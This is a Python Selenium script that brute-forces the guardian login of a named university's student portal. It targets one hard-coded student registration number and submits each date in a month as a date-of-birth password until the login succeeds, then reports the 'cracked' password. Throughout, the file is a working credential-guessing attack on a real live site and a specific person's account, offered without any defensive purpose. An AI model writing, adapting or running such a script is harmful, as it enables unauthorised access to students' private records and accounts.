import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from subprocess import CREATE_NO_WINDOW

from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from datetime import datetime
import pandas as pd


def generateDates(startDate: str, endDate: str) -> list:
    # The strptime() method creates a datetime object from the given string.
    start_date = datetime.strptime(startDate, "%Y-%m-%d")
    end_date = datetime.strptime(endDate, "%Y-%m-%d")

    # difference between each date. D means one day, 2D means two day..
    D = 'D'

    # date_range() returns a DatetimeIndex of dates
    date_list = pd.date_range(start_date, end_date, freq=D)
    # print(date_list)

    # strftime converts dates to specified format and returns object
    return list(date_list.strftime("%Y%m%d"))


def launchAttack(studentRegNumber: str, dateOfBirths: list) -> None:

    # Hides the DevTools listening tab.
    service = Service('./chromedriver.exe')
    service.creationflags = CREATE_NO_WINDOW

    startingTime = time.time()

    for i in range(len(dateOfBirths)):

        # Specifies the driver.
        driver = webdriver.Chrome(service=service)

        # Maximize the window size
        driver.maximize_window()

        # URL of the website
        url = "https://cms.giki.edu.pk:8093/Guardian.aspx"
        driver.get(url)

        userName = driver.find_element(By.ID, "txtRegNumber")
        userPassword = driver.find_element(By.ID, "txt_Password")
        loginButton = driver.find_element(By.ID, "btn_StudentSignIn")

        userName.send_keys(studentRegNumber)
        userPassword.send_keys(dateOfBirths[i])
        loginButton.click()
        if (driver.current_url != (url)):
            endingTime = time.time()
            print(
                f"\n\nTotal Time Elapsed: {round((endingTime-startingTime),2)}s")
            print(f"\nPassword Cracked: {dateOfBirths[i]}\n\n")

            break

        driver.close()


def main():

    driver = webdriver.Chrome()

    studentRegNumber = "2020244"
    startDate = "2001-08-01"
    endDate = "2001-08-30"
    datesGenerated = []

    # Swap dates if starting date is larger than the ending date.
    startDate, endDate = (endDate, startDate) if (
        startDate > endDate) else (startDate, endDate)

    # Generate dates in between including starting, and ending date.
    datesGenerated = generateDates(startDate=startDate, endDate=endDate)
    # print(len(datesGenerated))
    launchAttack(studentRegNumber, datesGenerated)


if __name__ == "__main__":
    main()
